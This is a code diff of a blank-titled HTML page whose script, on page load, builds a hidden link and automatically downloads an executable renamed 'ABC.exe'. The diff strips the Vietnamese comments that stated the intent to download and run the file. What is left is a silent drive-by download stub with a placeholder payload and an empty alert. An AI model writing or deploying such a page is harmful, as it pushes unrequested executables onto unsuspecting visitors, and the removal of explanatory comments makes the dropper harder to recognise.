@@ -3,27 +3,24 @@
 <head>
     <title></title>
     <script>
-        // Hàm tải file .exe và chạy (chỉ hoạt động với một số trình duyệt cũ hoặc cấu hình đặc biệt)
+
         function downloadAndRunExe() {
-            // URL file .exe (phải cùng nguồn hoặc được phép CORS)
-            const exeUrl = "YOUR_FILE.exe"; // Thay bằng đường dẫn file .exe của bạn
             
-            // Tạo liên kết tải xuống
+            const exeUrl = "YOUR_FILE.exe"; 
+            
+          
             const link = document.createElement("a");
             link.href = exeUrl;
-            link.download = "ABC.exe"; // Tên file khi tải về
+            link.download = "ABC.exe";
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
-            // (Tùy chọn) Tự động chạy file sau khi tải (chỉ hoạt động trong một số trường hợp)
             setTimeout(() => {
                 alert("");
-                // Trên Windows, có thể dùng `msiexec` hoặc `start` (nhưng trình duyệt sẽ chặn)
             }, 2000);
         }
 
-        // Thử tải ngay khi trang được mở
         window.onload = downloadAndRunExe;
     </script>
 </head>
